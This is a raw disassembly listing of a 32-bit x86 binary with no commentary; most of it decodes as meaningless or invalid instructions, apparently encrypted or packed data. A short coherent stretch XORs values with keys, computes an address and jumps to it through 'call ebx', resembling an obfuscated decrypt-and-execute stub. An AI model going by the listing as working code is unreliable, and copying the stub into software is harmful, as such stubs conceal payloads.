  415e92:	xor    BYTE PTR [esi-0x5da16d44],dl
  415e98:	pusha  
  415e99:	(bad)  
  415e9a:	call   0xda0b:0xcb05f339
  415ea1:	sbb    ebx,DWORD PTR [eax+eax*2+0x63]
  415ea5:	sbb    DWORD PTR [ebp-0x4b97a6fd],0x43
  415eac:	add    al,0x48
  415eae:	inc    edx
  415eaf:	mov    ds:0xaca1acb5,eax
  415eb4:	sub    BYTE PTR [ebp-0x54],bh
  415eb7:	inc    edx
  415eb8:	sub    BYTE PTR [esi-0x40],dl
  415ebb:	xchg   ecx,eax
  415ebc:	cmp    eax,0x8648f617
  415ec1:	and    DWORD PTR ds:0x2d90135d,ebx
  415ec7:	(bad)  
  415ec8:	mov    edi,0x241846c4
  415ecd:	push   ebx
  415ece:	in     eax,dx
  415ecf:	popf   
  415ed0:	push   ecx
  415ed1:	mov    ebx,0xb88d73f0
  415ed6:	xchg   ecx,eax
  415ed7:	retf   
  415ed8:	out    dx,al
  415ed9:	and    ebp,DWORD PTR es:[edx]
  415edc:	add    eax,0x3c45a822
  415ee1:	mov    edx,0xdeafdcf7
  415ee6:	push   esi
  415ee7:	pop    ebx
  415ee8:	push   ds
  415ee9:	int    0xf9
  415eeb:	adc    BYTE PTR [edi+esi*2+0x59d7c9f8],ch
  415ef2:	int3   
  415ef3:	and    ch,BYTE PTR [esi]
  415ef5:	(bad)  
  415ef6:	stc    
  415ef7:	mov    ch,0x56
  415ef9:	xchg   ebx,eax
  415efa:	xor    al,0x3c
  415efc:	loop   0x415f0f
  415efe:	jae    0x415f31
  415f00:	les    esp,FWORD PTR [ebx+0x7aeaa54e]
  415f06:	xor    eax,0x2c8463dd
  415f0b:	jbe    0x415ee5
  415f0d:	dec    ebp
  415f0e:	pop    ebp
  415f0f:	sub    al,0x4a
  415f11:	adc    esi,DWORD PTR [edx]
  415f13:	shr    BYTE PTR [edi-0x4a],1
  415f16:	mov    al,0x77
  415f18:	cmp    eax,0xaf505240
  415f1d:	ins    BYTE PTR es:[edi],dx
  415f1e:	mov    BYTE PTR [esi+0x48],bl
  415f21:	cdq    
  415f22:	cmp    BYTE PTR [edi+0x4e],dl
  415f25:	or     eax,0x2c796638
  415f2a:	retf   0x49c6
  415f2d:	xchg   ecx,eax
  415f2e:	and    eax,0xd75c3619
  415f33:	stos   BYTE PTR es:[edi],al
  415f34:	add    dh,BYTE PTR [edi+0x21]
  415f37:	shl    al,0xcb
  415f3a:	enter  0x29d6,0x29
  415f3e:	push   cs
  415f3f:	push   ss
  415f40:	lods   eax,DWORD PTR ds:[esi]
  415f41:	int3   
  415f42:	lods   eax,DWORD PTR ds:[esi]
  415f43:	xor    cl,al
  415f45:	and    DWORD PTR [eax+eax*8],0x7b4415f3
  415f4c:	and    BYTE PTR [edx-0x7c39e9cc],bl
  415f52:	cmp    BYTE PTR [ecx+0x594299fb],dl
  415f58:	pop    esi
  415f59:	fs scas eax,DWORD PTR es:[edi]
  415f5b:	lock pushf 
  415f5d:	aas    
  415f5e:	mov    ds:0x9ab26460,al
  415f63:	xor    DWORD PTR [eax-0x65],0x27c89db
  415f6a:	sub    dl,cl
  415f6c:	daa    
  415f6d:	test   al,0xdc
  415f6f:	sar    DWORD PTR [ebx-0x1f7ebd09],cl
  415f75:	push   0x2
  415f77:	sub    DWORD PTR [esi],edx
  415f79:	push   0xc555457a
  415f7e:	mov    dl,0x22
  415f80:	in     al,0xf6
  415f82:	das    
  415f83:	(bad)  
  415f85:	pop    ss
  415f86:	int3   
  415f87:	mov    al,0x12
  415f89:	mov    WORD PTR [esi+0x72],?
  415f8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415f8d:	lock push ds
  415f8f:	fwait
  415f90:	xlat   BYTE PTR ds:[ebx]
  415f91:	pop    esi
  415f92:	pop    eax
  415f93:	dec    ebp
  415f94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f95:	jns    0x415f9b
  415f97:	inc    ecx
  415f98:	call   0x52de6889
  415f9d:	jae    0x415fbb
  415f9f:	das    
  415fa0:	cmc    
  415fa1:	scas   eax,DWORD PTR es:[edi]
  415fa2:	or     BYTE PTR [eax+esi*8-0x60],cl
  415fa6:	or     edi,DWORD PTR [ebx-0x4c38abf3]
  415fac:	test   al,0xd4
  415fae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415faf:	xchg   ebp,eax
  415fb0:	add    al,0x8f
  415fb2:	cs push es
  415fb4:	shufps xmm3,xmm0,0x6d
  415fb8:	int3   
  415fb9:	pop    ecx
  415fba:	mov    eax,ds:0x3303f35d
  415fbf:	dec    ecx
  415fc0:	loop   0x416027
  415fc2:	mov    al,ds:0x9c12fc6d
  415fc7:	pushf  
  415fc8:	pop    ecx
  415fc9:	push   ecx
  415fca:	add    DWORD PTR [esi-0x58390fd7],ecx
  415fd0:	bound  edi,QWORD PTR ds:0x124eb78d
  415fd6:	dec    eax
  415fd7:	outs   dx,DWORD PTR ds:[esi]
  415fd8:	es pusha 
  415fda:	test   al,0x4b
  415fdc:	outs   dx,DWORD PTR ds:[esi]
  415fdd:	mov    DWORD PTR ds:0x53e22988,edx
  415fe3:	sbb    DWORD PTR [ecx+edx*2+0x51dc03b4],0xfaad367f
  415fee:	loope  0x415fc8
  415ff0:	mov    ch,0x29
  415ff2:	in     eax,dx
  415ff3:	fcomip st,st(0)
  415ff5:	xchg   esi,eax
  415ff6:	mov    DWORD PTR [edx+0x29],eax
  415ff9:	pop    ecx
  415ffa:	pop    ebx
  415ffb:	add    ebp,DWORD PTR [esi+esi*2]
  415ffe:	or     al,0x7d
  416000:	mov    ?,ebp
  416002:	les    ecx,FWORD PTR [esi]
  416004:	or     ecx,DWORD PTR [esi]
  416006:	mov    ah,BYTE PTR [ecx]
  416008:	add    eax,0x32a26fd6
  41600d:	pop    eax
  41600e:	sub    BYTE PTR [ebp+0xe77a9ca],ah
  416014:	jbe    0x415fef
  416016:	mov    dl,0xe6
  416018:	pop    ss
  416019:	jmp    0x5c28:0x276781e7
  416020:	test   ecx,edi
  416022:	fisub  DWORD PTR [eax-0x4c]
  416025:	or     esi,ebx
  416027:	aam    0x6f
  416029:	int    0x34
  41602b:	cwde   
  41602c:	jle    0x416036
  41602e:	and    BYTE PTR [ecx-0x6be786b4],0xc1
  416035:	(bad)  
  416036:	lock jno 0x416070
  416039:	push   ecx
  41603a:	jge    0x4160a6
  41603c:	std    
  41603d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41603e:	fmul   QWORD PTR [esi+0x28d41fe9]
  416044:	inc    ebp
  416045:	repz in al,0x99
  416048:	(bad)  
  416049:	mov    dl,al
  41604b:	ins    DWORD PTR es:[edi],dx
  41604c:	and    dh,BYTE PTR [edi+0x3]
  41604f:	jmp    0x2a64:0xf79afae7
  416056:	inc    ebp
  416057:	mov    WORD PTR [ebp-0x48f2a5e1],ss
  41605d:	sbb    al,0x80
  41605f:	add    eax,DWORD PTR [ecx]
  416061:	pop    ds
  416062:	ins    BYTE PTR es:[edi],dx
  416063:	cmp    ecx,ebp
  416065:	fld    DWORD PTR [eax]
  416067:	mov    edx,DWORD PTR [ebp+0x8]
  41606a:	xor    eax,ecx
  41606c:	lea    eax,[eax+edx*1+0x32729c]
  416073:	mov    DWORD PTR [ebp+0x8],eax
  416076:	mov    eax,DWORD PTR [ebp-0x18]
  416079:	mov    edx,DWORD PTR [ebp+0x14]
  41607c:	xor    eax,ecx
  41607e:	add    eax,esi
  416080:	imul   eax,DWORD PTR [edx]
  416083:	mov    edx,DWORD PTR [ebp-0x4]
  416086:	xor    edx,ecx
  416088:	jmp    0x41636c
  41608d:	adc    ecx,DWORD PTR [edx]
  41608f:	iret   
  416090:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416091:	aad    0x61
  416093:	jae    0x41603f
  416095:	jl     0x4160ed
  416097:	cs jge 0x4160cd
  41609a:	inc    eax
  41609b:	ret    
  41609c:	mov    esi,0x707f17ca
  4160a1:	mov    ecx,0x8870707e
  4160a6:	test   esi,ebp
  4160a8:	mov    DWORD PTR ds:0xf7f9c49c,esp
  4160ae:	xchg   esi,eax
  4160af:	lahf   
  4160b0:	push   esi
  4160b1:	xchg   ebp,eax
  4160b2:	mov    bl,0x50
  4160b4:	aam    0x8d
  4160b6:	ins    BYTE PTR es:[edi],dx
  4160b7:	push   esp
  4160b8:	mov    ch,bl
  4160ba:	call   0x2ebadb71
  4160bf:	lahf   
  4160c0:	cmp    ecx,esp
  4160c2:	dec    esi
  4160c3:	and    al,0xaa
  4160c5:	repnz adc esi,esp
  4160c8:	push   ss
  4160c9:	add    eax,0x403d1a14
  4160ce:	push   edx
  4160cf:	xor    edi,DWORD PTR [edi+0x2f]
  4160d2:	mov    dh,0xbf
  4160d4:	mov    al,ds:0x934c3a75
  4160d9:	lds    ecx,FWORD PTR [edx]
  4160db:	jp     0x416078
  4160dd:	and    eax,0x7b12652c
  4160e2:	std    
  4160e3:	fdivr  QWORD PTR [esi+0x6c01b73e]
  4160e9:	ins    DWORD PTR es:[edi],dx
  4160ea:	push   eax
  4160eb:	retf   0xafe6
  4160ee:	popa   
  4160ef:	imul   ebx,DWORD PTR [edi+esi*1],0x3a
  4160f3:	neg    BYTE PTR [ebx+0x76605ab2]
  4160f9:	movntq QWORD PTR [ecx-0x3bb5bd42],mm6
  416100:	hlt    
  416101:	jmp    0x48c152f3
  416106:	push   esi
  416107:	call   0xb949:0xe5778138
  41610e:	mov    edx,0x27d8d751
  416113:	and    ah,BYTE PTR [edi+0x38]
  416116:	lods   eax,DWORD PTR ds:[esi]
  416117:	jl     0x416115
  416119:	cmc    
  41611a:	ja     0x416110
  41611c:	jp     0x416160
  41611e:	fcom   QWORD PTR [ecx+eax*8+0x36cddc19]
  416125:	cli    
  416126:	dec    ecx
  416127:	(bad)  ds:0x2dbbfb9c
  41612d:	sub    esi,DWORD PTR fs:[esi+0x9a08b08]
  416134:	stc    
  416135:	dec    edi
  416136:	into   
  416137:	in     eax,0xf6
  416139:	xor    DWORD PTR [ebp-0x6a816650],eax
  41613f:	dec    esi
  416140:	sbb    al,BYTE PTR [esi]
  416142:	jp     0x41617e
  416144:	leave  
  416145:	cld    
  416146:	ror    DWORD PTR [ecx+0x1a570495],1
  41614c:	pop    ebp
  41614d:	sbb    DWORD PTR [ebx-0x40],0x9d6aa978
  416154:	jecxz  0x416199
  416156:	js     0x416172
  416158:	das    
  416159:	mov    bh,BYTE PTR [esi+0x4190af46]
  41615f:	add    BYTE PTR [ecx-0x1d],bl
  416162:	jecxz  0x416180
  416164:	dec    edx
  416165:	int    0xa1
  416167:	ins    DWORD PTR es:[edi],dx
  416168:	call   0x8cb8725
  41616d:	(bad)  
  41616e:	adc    cl,BYTE PTR [ecx-0x34]
  416171:	xchg   ebx,eax
  416172:	sbb    ch,ch
  416174:	mov    fs,WORD PTR [ecx+0x7355d1a6]
  41617a:	sti    
  41617b:	(bad)  [edx+0x48]
  41617e:	call   0x185b:0xb773cf36
  416185:	sbb    al,0x9e
  416187:	into   
  416188:	jmp    0xaa97da53
  41618d:	jmp    0x416205
  41618f:	not    ch
  416191:	test   DWORD PTR [eax+0x28],eax
  416194:	xchg   edi,eax
  416195:	stos   BYTE PTR es:[edi],al
  416196:	ret    0xfc92
  416199:	cli    
  41619a:	int    0x4d
  41619c:	ret    
  41619d:	loop   0x41614f
  41619f:	sub    al,0x59
  4161a1:	mov    esi,0xfdefd02b
  4161a6:	mov    al,0x2e
  4161a8:	pop    eax
  4161a9:	shr    BYTE PTR [edx-0x492ba299],1
  4161af:	jge    0x416148
  4161b1:	es mov ebp,ebp
  4161b4:	jnp    0x4161fc
  4161b6:	mov    ecx,0x2173a780
  4161bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4161bc:	and    cl,BYTE PTR [edx+0x63]
  4161bf:	je     0x4161a9
  4161c1:	call   0xd93a2a34
  4161c6:	sub    al,0x6
  4161c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4161c9:	jbe    0x41616e
  4161cb:	pop    es
  4161cc:	cld    
  4161cd:	lods   eax,DWORD PTR ds:[esi]
  4161ce:	int3   
  4161cf:	repz enter 0x2f4f,0xaf
  4161d4:	sub    DWORD PTR [ebp-0x75],edi
  4161d7:	fwait
  4161d8:	repz das 
  4161da:	sub    BYTE PTR [edi],ch
  4161dc:	sti    
  4161dd:	xchg   DWORD PTR [ecx+0x1b],ebx
  4161e0:	js     0x416219
  4161e2:	xchg   esp,eax
  4161e3:	bswap  ebx
  4161e5:	mov    cl,0x9a
  4161e7:	xor    ecx,DWORD PTR [esi]
  4161e9:	out    0xc6,al
  4161eb:	sub    dl,0xb6
  4161ee:	mov    DWORD PTR [edx],edx
  4161f0:	(bad)  
  4161f2:	pop    ss
  4161f3:	or     al,0xf2
  4161f5:	test   al,0x0
  4161f7:	(bad)  
  4161f8:	mov    eax,0x16ad1ecb
  4161fd:	and    al,BYTE PTR [edx]
  4161ff:	fnsave [edx-0x7e]
  416202:	retf   
  416203:	hlt    
  416204:	pop    eax
  416205:	mov    esp,0xbbbcef03
  41620a:	fld    DWORD PTR [edx-0x76a844b3]
  416210:	cs fcomp st(4)
  416213:	jbe    0x4161d2
  416215:	jmp    0xe4a9:0x4378ff90
  41621c:	(bad)  
  41621d:	clc    
  41621e:	cdq    
  41621f:	pslld  mm6,0xc7
  416223:	jbe    0x4161aa
  416225:	adc    al,0xe
  416227:	std    
  416228:	mov    bh,0xdd
  41622a:	xchg   edi,eax
  41622b:	dec    ebx
  41622c:	xchg   esi,eax
  41622d:	mov    al,cl
  41622f:	ret    0xe22e
  416232:	iret   
  416233:	int3   
  416234:	jmp    0x4ab4b59
  416239:	push   ebp
  41623a:	and    al,0x94
  41623c:	test   al,0xc
  41623e:	loopne 0x41620e
  416240:	sahf   
  416241:	imul   edi,DWORD PTR [ebx-0x77],0x2e1f7e8e
  416248:	sub    DWORD PTR [ebx-0x80],esp
  41624b:	mov    cl,0x3b
  41624d:	mov    ebx,0x540a5071
  416252:	mov    esp,0xc69581bd
  416257:	cdq    
  416258:	jae    0x4161fa
  41625a:	cld    
  41625b:	or     cl,BYTE PTR [edi]
  41625d:	mov    ds:0x11f2bedc,al
  416262:	jmp    0x4fe:0x74d265f5
  416269:	add    eax,0x91d73948
  41626e:	ret    0x1908
  416271:	or     BYTE PTR [eax+0x53469ba7],dl
  416277:	ret    
  416278:	xor    edi,eax
  41627a:	nop
  41627b:	push   ecx
  41627c:	pusha  
  41627d:	hlt    
  41627e:	sub    al,0x1b
  416280:	leave  
  416281:	fsubp  st(6),st
  416283:	xor    esi,DWORD PTR [ecx+0x545a78dc]
  416289:	dec    ecx
  41628a:	aas    
  41628b:	sahf   
  41628c:	aaa    
  41628d:	mov    edx,0xe3ea4f88
  416292:	add    ebp,0xee5aac74
  416298:	jmp    0x41624e
  41629a:	fistp  QWORD PTR [ecx-0x556fca66]
  4162a0:	or     al,0xf1
  4162a2:	sar    ebx,1
  4162a4:	bound  esi,QWORD PTR [edi-0x38]
  4162a7:	cmc    
  4162a8:	int    0x38
  4162aa:	pop    edx
  4162ab:	lods   eax,DWORD PTR ds:[esi]
  4162ac:	aam    0x8d
  4162ae:	add    DWORD PTR [ebx+0x68059955],0x1cab53e8
  4162b8:	adc    BYTE PTR gs:[ebp-0x3d],dh
  4162bc:	sub    ecx,esi
  4162be:	mov    BYTE PTR [ebp+0x57518494],cl
  4162c4:	aas    
  4162c5:	pop    eax
  4162c6:	inc    edi
  4162c7:	xchg   ebx,edx
  4162c9:	sub    dl,BYTE PTR [ebp-0x3b1ad4d]
  4162cf:	in     al,0x62
  4162d1:	(bad)  
  4162d2:	jmp    0x416255
  4162d4:	and    BYTE PTR [edx+0x1df9be9b],bl
  4162da:	je     0x4162b2
  4162dc:	arpl   WORD PTR [esi],ax
  4162de:	inc    ecx
  4162df:	adc    BYTE PTR [ebx+0x40],bl
  4162e2:	and    al,0x73
  4162e4:	outs   dx,DWORD PTR ds:[esi]
  4162e5:	and    al,0x8c
  4162e7:	aam    0xc
  4162e9:	xchg   BYTE PTR [eax],dl
  4162eb:	or     BYTE PTR [esi+0x9b33c11],0x2b
  4162f2:	xchg   edx,eax
  4162f3:	into   
  4162f4:	sub    DWORD PTR [ebx-0x21],ebx
  4162f7:	adc    BYTE PTR [ebp+0x43],0x6f
  4162fb:	jnp    0x416371
  4162fd:	sub    esp,DWORD PTR [eax+0x4f]
  416300:	repnz jmp 0xac95:0x8ddc5b1c
  416308:	adc    edx,ebp
  41630a:	(bad)
  41630f:	inc    esi
  416310:	sti    
  416311:	xchg   esi,eax
  416312:	jne    0x41633e
  416314:	shl    cl,0x66
  416317:	lods   al,BYTE PTR ds:[esi]
  416318:	ja     0x41638b
  41631a:	inc    edi
  41631b:	ficomp DWORD PTR [edi-0x67]
  41631e:	and    al,0x38
  416320:	sub    BYTE PTR [edi],dl
  416322:	cmp    ch,bh
  416324:	pop    ds
  416325:	pusha  
  416326:	test   BYTE PTR [ebx+0x38],bl
  416329:	mov    ebp,0x17fcab97
  41632e:	mov    ah,0x39
  416330:	push   ebp
  416331:	sub    BYTE PTR [edi+0x3],bl
  416334:	sbb    DWORD PTR [esi],edx
  416336:	fcmove st,st(1)
  416338:	pusha  
  416339:	inc    edx
  41633a:	retf   
  41633b:	stos   BYTE PTR es:[edi],al
  41633c:	cdq    
  41633d:	xchg   ebp,eax
  41633e:	mov    ch,0xf
  416340:	adc    eax,ebx
  416342:	mov    al,0xf
  416344:	mov    bl,0x2
  416346:	lock push ebx
  416348:	iret   
  416349:	arpl   WORD PTR [ecx],bx
  41634b:	fistp  WORD PTR [ebp-0x33a6b400]
  416351:	and    eax,esi
  416353:	scas   al,BYTE PTR es:[edi]
  416354:	dec    esp
  416355:	add    ebp,ebp
  416357:	repz (bad) 
  41635a:	(bad)  [edi+0x54]
  41635d:	data16 in al,dx
  41635f:	mov    bl,0x3e
  416361:	lea    ebp,ds:0x8a6ab42a
  416367:	out    0x2b,al
  416369:	inc    eax
  41636a:	xlat   BYTE PTR ds:[ebx]
  41636b:	iret   
  41636c:	mov    ecx,DWORD PTR [ebp+0x8]
  41636f:	lea    ecx,[edx+ecx*1+0x32729c]
  416376:	cmp    ecx,eax
  416378:	jne    0x4154a0
  41637e:	mov    ebx,esi
  416380:	jmp    0x41638a
  416385:	mov    ebx,0x32729c
  41638a:	mov    eax,DWORD PTR [ebp-0x4]
  41638d:	xor    eax,0x7510855
  416392:	add    eax,ebx
  416394:	mov    DWORD PTR [ebp-0xc],eax
  416397:	xor    ebx,ebx
  416399:	lea    eax,[ebp-0x10]
  41639c:	add    ebx,DWORD PTR [eax]
  41639e:	call   ebx
  4163a0:	xor    ebx,ebx
  4163a2:	inc    ebx
  4163a3:	cmp    DWORD PTR [ebp+0x10],ebx
  4163a6:	je     0x416f54
  4163ac:	jmp    0x416690
  4163b1:	or     al,0x9a
  4163b3:	shl    DWORD PTR [esi],1
  4163b5:	jno    0x41642c
  4163b7:	jmp    0x41636b
  4163b9:	lds    ecx,FWORD PTR ds:0x8fb2c841
  4163bf:	test   BYTE PTR [ebx],dh
  4163c1:	adc    edx,DWORD PTR [edi+edi*2]
  4163c4:	jo     0x41637f
  4163c6:	jle    0x416438
  4163c8:	jo     0x416374
  4163ca:	sub    eax,0x6c2e758e
  4163cf:	outs   dx,DWORD PTR ds:[esi]
  4163d0:	push   esp
  4163d1:	ds ins BYTE PTR es:[edi],dx
  4163d3:	adc    BYTE PTR [eax],bh
  4163d5:	aad    0x51
  4163d7:	adc    eax,0x2caebd0e
  4163dc:	sub    al,0xb9
  4163de:	cdq    
  4163df:	xchg   esp,eax
  4163e0:	sub    BYTE PTR [esi+eax*8-0x17f3027f],0x79
  4163e8:	xor    al,BYTE PTR [eax]
  4163ea:	dec    esi
  4163eb:	or     BYTE PTR [edi+0x42],bl
  4163ee:	or     ch,al
  4163f0:	(bad)  
  4163f1:	repnz mov ebp,0x4f0ca7bc
  4163f7:	dec    ebx
  4163f8:	jbe    0x41640c
  4163fa:	cwde   
  4163fb:	aad    0xff
  4163fd:	pop    esp
  4163fe:	pushf  
  4163ff:	stos   BYTE PTR es:[edi],al
  416400:	iret   
  416401:	sub    al,0x90
  416403:	fld    QWORD PTR [ebx]
  416405:	mov    cs,WORD PTR [ecx+0xd]
  416408:	pop    ebp
  416409:	aam    0xb1
  41640b:	movd   mm0,DWORD PTR [ecx+0xf]
  41640f:	and    BYTE PTR [ebp+0x363f7eea],cl
  416415:	push   eax
  416416:	outs   dx,BYTE PTR ds:[esi]
  416417:	jmp    0x2163:0x6ffdcebf
  41641e:	pop    ecx
  41641f:	addr16 sbb dl,al
  416422:	or     DWORD PTR [edi+0x5e],eax
  416425:	sbb    ecx,DWORD PTR [ecx-0x10]
  416428:	mov    esp,0xa69992e6
  41642d:	push   es
  41642e:	or     BYTE PTR cs:[eax-0x6ec1b317],cl
  416435:	dec    esp
  416436:	jle    0x416477
  416438:	add    al,0x47
  41643a:	mov    ah,0x3
  41643c:	repz ja 0x4163e5
  41643f:	adc    BYTE PTR [edx-0x27],ah
  416442:	mov    DWORD PTR [esi+0x21e437c8],esi
  416448:	je     0x41641a
  41644a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41644b:	je     0xf76032f0
  416451:	stos   BYTE PTR es:[edi],al
  416452:	inc    ebx
  416453:	popf   
  416454:	and    DWORD PTR [ebp+edx*2-0x66],0xc92b6989
  41645c:	jmp    0xcd40abbe
  416461:	popa   
  416462:	pandn  mm6,QWORD PTR [ecx-0x23f8e4b9]
  416469:	sub    eax,0xceb3df3d
  41646e:	add    eax,0x2967ac40
  416473:	popf   
  416474:	inc    edx
  416475:	and    al,0xc5
  416477:	mov    al,ah
  416479:	push   esp
  41647a:	dec    ecx
  41647b:	scas   eax,DWORD PTR es:[edi]
  41647c:	pop    ebx
  41647d:	lods   al,BYTE PTR ds:[esi]
  41647e:	push   edx
  41647f:	in     eax,0xb9
  416481:	xor    al,0x8
  416483:	sbb    cl,al
  416485:	push   cs
  416486:	iret   
  416487:	mov    ss,WORD PTR [esi+0x18]
  41648a:	mov    eax,ds:0x3e875bfb
  41648f:	jecxz  0x41641c
  416491:	adc    BYTE PTR [eax],0xf6
  416494:	cmp    BYTE PTR [ebp+0x417078f5],ch
  41649a:	ja     0x416465
  41649c:	sbb    eax,0x28609080
  4164a1:	mov    eax,ds:0x5a38d677
  4164a6:	inc    ecx
  4164a7:	or     esp,esp
  4164a9:	out    dx,eax
  4164aa:	xchg   edi,eax
  4164ab:	loope  0x416485
  4164ad:	add    bl,al
  4164af:	cmp    al,0x95
  4164b1:	idiv   BYTE PTR [ebp-0x31]
  4164b4:	sub    DWORD PTR [esi*4+0x573f422f],edi
  4164bb:	xor    al,0xa
  4164bd:	jno    0x4164fd
  4164bf:	mov    dh,0xb0
  4164c1:	into   
  4164c2:	(bad)  
  4164c3:	imul   edi,DWORD PTR [esi+0x23],0xaf06d458
  4164ca:	jne    0x416495
  4164cc:	ja     0x416508
  4164ce:	int3   
  4164cf:	mov    WORD PTR [ebx],?
  4164d1:	call   FWORD PTR ds:0xefe0b98f
  4164d7:	mov    edx,cs
  4164d9:	push   eax
  4164da:	adc    ah,BYTE PTR [edx+eax*8-0x143ae577]
  4164e1:	aad    0x48
  4164e3:	enter  0xe736,0x51
  4164e7:	fs mov ch,0x41
  4164ea:	cmp    al,0x5f
  4164ec:	push   0xa53848af
  4164f1:	mov    bl,0x3c
  4164f3:	dec    edx
  4164f4:	ins    DWORD PTR es:[edi],dx
  4164f5:	push   eax
  4164f6:	or     al,0xc0
  4164f8:	cmp    ecx,DWORD PTR [eax-0x5d]
  4164fb:	pop    ecx
  4164fc:	rcl    edi,cl
  4164fe:	pop    edx
  4164ff:	imul   esp,eax,0x44
  416502:	pop    esp
  416503:	xchg   esi,eax
  416504:	das    
  416505:	or     ecx,ebp
  416507:	mov    dh,0x64
  416509:	pop    esi
  41650a:	stos   BYTE PTR es:[di],al
  41650c:	xchg   esp,eax
  41650d:	mov    al,ds:0x11ee12a6
  416512:	dec    ecx
  416513:	les    edi,FWORD PTR [ebx-0x2f]
  416516:	push   0x27
  416518:	rol    edi,0x66
  41651b:	xchg   DWORD PTR [ebx],ecx
  41651d:	adc    esi,edx
  41651f:	call   0x5b9d8e2e
  416524:	inc    esi
  416525:	cmp    DWORD PTR [ebp+0x1d],ecx
  416528:	mov    edi,0xb2234e6c
  41652d:	clc    
  41652e:	jae    0x416500
  416530:	lods   eax,DWORD PTR ds:[esi]
  416531:	(bad)  
  416532:	aam    0x97
  416534:	jl     0x41656f
  416536:	xlat   BYTE PTR ds:[ebx]
  416537:	add    BYTE PTR [edx],cl
  416539:	pop    es
  41653a:	jl     0x416536
  41653c:	nop
  41653d:	push   esi
  41653e:	sbb    dh,BYTE PTR [ecx+0x3c951046]
  416544:	iret   
  416545:	xor    ebp,eax
  416547:	xchg   esi,eax
  416548:	push   esp
  416549:	push   ebp
  41654a:	pop    ecx
  41654b:	sbb    ebx,DWORD PTR [ecx]
  41654d:	dec    ebx
  41654e:	aad    0xb5
  416550:	das    
  416551:	mov    ebp,0x6311d971
  416556:	sub    esp,DWORD PTR [esi]
  416558:	xchg   DWORD PTR [ecx-0x78],ebp
  41655b:	or     ebx,DWORD PTR ds:[edx+0x7bb4425]
  416562:	add    BYTE PTR [ecx],cl
  416564:	cmp    bl,bh
  416566:	test   BYTE PTR [edx],0x66
  416569:	inc    esp
  41656a:	inc    ebx
  41656b:	mov    edx,0xfb5003e1
  416570:	xrelease mov DWORD PTR [ebx],eax
  416573:	(bad)  
  416574:	call   0x3a2d2c2f
  416579:	push   ebp
  41657a:	or     DWORD PTR [esi],edi
  41657c:	test   ebp,ecx
  41657e:	cmp    ebx,DWORD PTR ds:[ecx]
  416581:	mov    ch,0xed
  416583:	retf   0xc288
  416586:	test   eax,0x4905c4bd
  41658b:	std    
  41658c:	rol    DWORD PTR [edx+0x20646ac],1
  416592:	lahf   
  416593:	sub    BYTE PTR [edi-0x27f13335],bh
  416599:	(bad)  
  41659a:	xor    al,0x38
  41659c:	stos   BYTE PTR es:[edi],al
  41659d:	sar    DWORD PTR [edx+0x28],1
  4165a0:	mov    WORD PTR [ebp+0x4292b8d3],fs
  4165a6:	and    dl,BYTE PTR [edi+ecx*2+0x56]
  4165aa:	push   ds
  4165ab:	cmp    bh,bh
  4165ad:	mov    bl,BYTE PTR [edi]
  4165af:	jge    0x416621
  4165b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4165b2:	iret   
  4165b3:	repnz shr esp,cl
  4165b6:	push   cs
  4165b7:	push   es
  4165b8:	push   0x5efc6fd5
  4165bd:	icebp  
  4165be:	lea    ebp,[edx+0x3e4136c2]
  4165c4:	mov    al,0x5d
  4165c6:	mov    eax,0x48e87e53
  4165cb:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  4165cd:	out    0x63,ax
  4165d0:	mov    ebx,es
  4165d2:	sub    edi,DWORD PTR [ebx]
  4165d4:	pushf  
  4165d5:	mov    al,0x7a
  4165d7:	mov    dh,0x3a
  4165d9:	jno    0x416632
  4165db:	push   eax
  4165dc:	test   BYTE PTR [edi+0x78],0x90
  4165e0:	fistp  QWORD PTR [ecx-0x433b512c]
  4165e6:	sbb    BYTE PTR [edi-0x7],cl
  4165e9:	mov    ds:0x1ac72369,al
  4165ee:	ds adc eax,0xa5af6475
  4165f4:	fisttp DWORD PTR [esi+0x52]
  4165f7:	gs (bad) 
  4165f9:	sahf   
  4165fa:	outs   dx,BYTE PTR ds:[esi]
  4165fb:	inc    ebx
  4165fc:	dec    DWORD PTR [edx-0xc5279e9]
  416602:	jmp    0x416670
  416604:	imul   eax,DWORD PTR [edx],0x75169b42
  41660a:	scas   al,BYTE PTR es:[edi]
  41660b:	cmp    BYTE PTR [esi-0x60],ch
  41660e:	jne    0x41668c
  416610:	inc    BYTE PTR [edi+0x7d39218c]
  416616:	xchg   BYTE PTR ds:0x1f130d0b,ch
  41661c:	jo     0x4165ca
  41661e:	cmp    ah,BYTE PTR [esp+edx*1-0x4d]
  416622:	loope  0x416611
  416624:	jae    0x41668f
  416626:	or     eax,ebp
  416628:	popa   
  416629:	push   ss
  41662a:	ins    DWORD PTR es:[edi],dx
  41662b:	dec    esp
  41662c:	shl    BYTE PTR [edx],0x7d
  41662f:	out    0xb4,eax
  416631:	pop    eax
  416632:	sub    DWORD PTR [esi+0x48],esi
  416635:	ds in  al,dx
  416637:	outs   dx,DWORD PTR ds:[esi]
  416638:	iret   
  416639:	idiv   DWORD PTR [edx]
  41663b:	scas   eax,DWORD PTR es:[edi]
  41663c:	nop
  41663d:	xor    bl,BYTE PTR [edi+ebp*4]
  416640:	sbb    eax,0x9ecad0d1
  416645:	adc    eax,0x82ec2a20
  41664a:	jbe    0x41667c
  41664c:	or     al,0xa9
  41664e:	sahf   
  41664f:	mov    BYTE PTR ds:0xdb7601c6,0xab
  416656:	cmp    DWORD PTR ds:0x3fdaecf7,eax
  41665c:	gs xor al,0x28
  41665f:	test   eax,0x8eb153fd
  416664:	cmp    BYTE PTR [ebx-0x19],dh
  416667:	lods   al,BYTE PTR ds:[esi]
  416668:	mov    al,ds:0x1a7c7109
  41666d:	xchg   esi,eax
  41666e:	mov    dh,dh
  416670:	push   es
  416671:	dec    eax
  416672:	in     al,0x2b
  416674:	fsubr  QWORD PTR [ecx+edi*8-0x680eeb58]
  41667b:	out    dx,al
  41667c:	add    esp,edx
  41667e:	adc    eax,DWORD PTR [esi]
  416680:	clc    
  416681:	sti    
  416682:	sub    esi,DWORD PTR [ecx]
